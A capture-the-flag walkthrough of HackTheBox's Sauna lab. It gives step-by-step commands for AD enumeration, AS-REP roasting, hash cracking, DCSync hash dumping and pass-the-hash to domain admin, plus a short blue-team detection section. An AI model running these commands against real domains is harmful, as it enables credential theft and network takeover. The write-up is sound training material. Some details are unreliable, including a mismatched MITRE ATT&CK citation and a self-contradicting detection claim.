# Sauna (HackTheBox) — AD Enumeration & AS-REP Roasting

A practical walkthrough of HTB's Sauna box, focusing on AD enumeration techniques and AS-REP roasting exploitation.

---

## Reconnaissance

### DNS & Service Discovery

**nmap with script scanning:**
```bash
nmap -sC -sV <target-ip>
```

Use `-sC` to enable NSE scripts—this reveals DNS information and domain names.

**Key Finding:** Identifies the domain name (e.g., `EGOTISTICAL-BANK.LOCAL`)

### Web Enumeration

- **Burp Suite** — Intercept and analyze web traffic for additional domain information
- **Wappalyzer** — Identify technologies and potential information disclosure

---

## LDAP Enumeration

### windapsearch

Powerful LDAP query tool for AD enumeration without credentials.

**Installation:**
```bash
git clone https://github.com/ropnop/windapsearch.git
```

**Usage (Anonymous Bind):**
```bash
python3 windapsearch.py -d DOMAIN.LOCAL --dc-ip <DC_IP>
```

**Example:**
```bash
python3 windapsearch.py -d EGOTISTICAL-BANK.LOCAL --dc-ip 10.129.1.88
```

**Output:** Extracts users, computers, groups, and other AD objects via LDAP (port 389).

---

## Username Generation

### username-anarchy

Generates potential usernames from first/last names using common naming conventions.

**Installation:**
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
```

**Naming Formats:**
- `first` — First name only
- `flast` — First initial + last name
- `first.last` — First name + dot + last name
- `firstl` — First name + last initial

**Usage:**
```bash
./username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > usernamelist.txt
```

**Example Output:**
```
fergus
fergus.smith
ferguss
fsmith
hugo
hugo.bear
hugob
hbear
```

**Attack Context:** Combine enumerated names with password spraying or hash extraction attacks.

---

## AS-REP Roasting

### What is AS-REP Roasting?

AS-REP (authentication Service Response) roasting exploits a Kerberos misconfiguration where user accounts have **"Do not require Kerberos preauthentication"** enabled.


### Why It's Vulnerable

**Normal Kerberos Pre-Authentication Flow:**
1. Client sends pre-authentication data (timestamp encrypted with user's password hash)
2. KDC verifies the timestamp proves knowledge of the password
3. KDC returns a Ticket Granting Ticket (TGT)

**With Pre-Authentication Disabled:**
1. Client sends a dummy Authentication Service Request (AS-REQ) without credentials
2. KDC validates the user exists and returns an encrypted Ticket Granting Ticket (TGT)
3. The TGT is encrypted with the user's **NTLM hash**
4. Attacker can crack this hash offline without valid credentials

### Exploitation: GetNPUsers.py (Impacket)

Queries for users with pre-authentication disabled and extracts crackable hashes.

**Installation:**
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

**Single User:**
```bash
python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/username -request -no-pass -dc-ip 10.129.1.88
```

**Multiple Users (Batch):**
```bash
while read p; do python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/"$p" -request -no-pass -dc-ip 10.129.1.88 >> hash.txt; done < usernamelist.txt
```

**Example Output (Crackable Hash):**
```
$krb5asrep$23$sfrancis@EGOTISTICAL-BANK.LOCAL:hash_data_here
```

### Cracking the Hash

**Using hashcat:**
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Mode 18200:** Kerberos 5 AS-REP etype 23 ($krb5asrep$23$) — RC4-HMAC hash format

**Success:** Reveals the plaintext password of the pre-auth disabled account.

**Hashcat Mode Reference:**

| Mode | Kerberos Type | Encryption | Notes |
|:---|:---|:---|:---|
| 7500 | Kerberos 5 AS-REQ Pre-Auth | etype 23 (RC4-HMAC) | Legacy, commonly cracked |
| 19800 | Kerberos 5 Pre-Auth | etype 17 (AES-128) | Stronger encryption |
| 19900 | Kerberos 5 Pre-Auth | etype 18 (AES-256) | Most secure |

---

## Initial Access (Lateral Movement)

### evil-winrm

Remote Windows shell access using extracted credentials.

**Installation:**
```bash
git clone https://github.com/Hackplayers/evil-winrm.git
```

**Usage:**
```bash
./evil-winrm.rb -i <target-ip> -u <username> -p '<password>'
```

**Example:**
```bash
./evil-winrm.rb -i 10.129.4.62 -u fsmith -p 'Thestrokes23'
```

**Result:** Interactive PowerShell session on remote Windows host

---

## Post-Exploitation Enumeration

### winPEAS (Windows Privilege Escalation Awesome Script)

Automated script that identifies common privilege escalation vectors on Windows.

**GitHub:** [peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng)

**Capabilities:**
- Misconfigured services (unquoted paths, weak permissions)
- Stored credentials (registry, config files, SAM/LSASS memory)
- Registry misconfigurations
- Token privileges and UAC bypass vectors
- Scheduled tasks and ACL misconfigurations
- And other privilege escalation paths

**Usage:**
```powershell
# Upload to target
upload ~/path/to/winPEAS.ps1

# Execute
./winPEAS.ps1
```

**Output Analysis:** Review for privilege escalation vectors (weak permissions, stored creds, service misconfigurations)

---

## Credential Dumping

### secretsdump.py (Impacket)

Extracts NTLM hashes and Kerberos keys from Domain Controller or compromised machine with elevated privileges.

**Two Methods:**

**Method 1: Via DRSUAPI (Network Request)**
- Requires valid domain credentials with DCSync rights
- Does not require interactive shell access
- Safer for evasion

```bash
python3 secretsdump.py domain/user@target-ip -just-dc-user Administrator
```

**Method 2: Via Mimikatz (Interactive Shell)**
- Requires high-integrity shell (admin)
- Directly interacts with LSASS process via WinAPI
- More detectable

**Example Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
```

---

## Privilege Escalation to Domain Admin

### psexec.py (Impacket)

Executes commands on remote system using extracted administrator NTLM hash (Pass-the-Hash attack).

**Usage:**
```bash
python3 psexec.py Administrator@<target-ip> cmd.exe -hashes <lm_hash>:<nt_hash>
```

**Example:**
```bash
python3 psexec.py Administrator@10.129.4.62 cmd.exe -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

**Result:** SYSTEM-level command execution on domain controller

---

## Key Learnings

### Why AS-REP Roasting Works
- **Root Cause:** Pre-authentication disabled (often legacy systems or Alfresco deployments)
- **Attacker Advantage:** No valid credentials needed; offline cracking
- **Detection Gap:** Can be performed without generating normal authentication logs

### Attack Chain Summary
1. Enumerate domain names via nmap/DNS
2. Gather user lists via LDAP (windapsearch)
3. Generate username variations (username-anarchy)
4. Extract hashes from pre-auth disabled accounts (GetNPUsers.py)
5. Crack hashes offline (hashcat)
6. Use credentials for further exploitation

### Blue Team Perspective
- **Detection:** Monitor for AS-REP requests from unknown users
- **Logs:** Event ID 4768 (Kerberos TGT request) without pre-authentication
- **Mitigation:** Enforce pre-authentication on all user accounts; disable legacy authentication if possible

---



## Tools Summary

### Initial Access

| Tool | Purpose | Status |
|:---|:---|:---|
| **nmap** | Network reconnaissance, service discovery | ✅ Native |
| **Burp Suite** | Web traffic analysis | ✅ Manual |
| **windapsearch** | LDAP enumeration (anonymous) | ✅ Standalone Python |
| **username-anarchy** | Username generation from names | ✅ Standalone script |
| **GetNPUsers.py** (Impacket) | AS-REP hash extraction | ✅ Standalone Python |
| **hashcat** | Hash cracking (mode 18200) | ✅ Native |

### Post-Exploitation & Credential Dumping

| Tool | Purpose | Status |
|:---|:---|:---|
| **evil-winrm** | Interactive PowerShell shell over WinRM | ✅ Standalone Ruby |
| **winPEAS.ps1** | Windows privilege escalation enumeration | ✅ Standalone PowerShell |
| **secretsdump.py** (Impacket) | NTLM hash/Kerberos key extraction | ✅ Standalone Python |
| **psexec.py** (Impacket) | Remote code execution (Pass-the-Hash) | ✅ Standalone Python |
| **BloodHound** | AD graph visualization & attack path finding | ⚪ Planned |

---

## References

- [ropnop/windapsearch](https://github.com/ropnop/windapsearch)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)
- [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
- [Hashcat Mode Reference](https://hashcat.net/wiki/doku.php?id=hashcat)
- MITRE ATT&CK: [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)
- https://github.com/Hackplayers/evil-winrm